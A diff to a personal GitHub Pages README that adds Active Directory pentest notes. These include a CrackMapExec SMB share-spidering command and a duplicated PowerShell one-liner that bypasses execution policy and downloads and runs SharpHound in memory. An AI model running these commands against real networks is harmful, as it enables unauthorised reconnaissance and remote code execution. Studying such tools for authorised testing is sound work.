@@ -4,13 +4,28 @@ You can use the [editor on GitHub](https://github.com/aasphixie/aasphixie.github
 
 Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
 
-### One-liner powershell code
+### Pentest Active Directory
 
-Usefull tips to load and execute directly in memory.
+CrackMapExec :
+
+```markdown
+cme smb -u 'XXX' -p 'XXX' -M spider_plus IP_ADDRESS/MASK
+```
+
+### PowerShell one-liners
+
+Bloodhound :
 
 ```markdown
 powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound
 ```
+
+Bloodhound :
+
+```markdown
+powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound
+```
+
 # Header 1
 ## Header 2
 ### Header 3
